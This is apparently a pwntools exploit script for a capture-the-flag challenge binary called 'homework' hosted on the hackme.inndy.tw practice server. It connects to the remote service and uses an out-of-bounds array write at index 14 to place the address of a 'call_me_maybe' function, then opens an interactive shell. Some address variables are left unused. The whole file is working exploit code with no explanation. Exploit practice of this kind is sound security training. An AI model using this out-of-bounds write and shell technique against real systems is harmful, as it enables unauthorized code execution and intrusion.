# -*- coding: utf-8 -*-

#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'Flyour'

from pwn import *
context(terminal=['gnome-terminal', '-x', 'sh', '-c'], arch='i386', os='linux', log_level='debug')

def debug(addr='0x0804892b'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

shellcode = "/bin/sh\0"

elf = ELF('./homework')
exec_system = elf.plt['system']
print "%x" % exec_system
gets_addr = elf.symbols['gets']
print "%x" % gets_addr
#bss_addr = elf.bss()
bss_addr = 0x804a070

print "%x" % bss_addr

#io = process('./homework')
io = remote('hackme.inndy.tw', 7701)

pop_ret = 0x0804892b  # pop_ret
system_addr = 0x08048609

name = "fda"
act = "1"

print "gets_addr: " + str(gets_addr)
print "bss: " + str(bss_addr)
print "pop_ret: " + str(pop_ret)

call_me_maybe = 0x080485fb

#debug()

io.sendline(name)

io.sendline(act)
io.sendline(str(14))
io.sendline(str(call_me_maybe))

io.sendline(str(0))

io.interactive()


io.close()
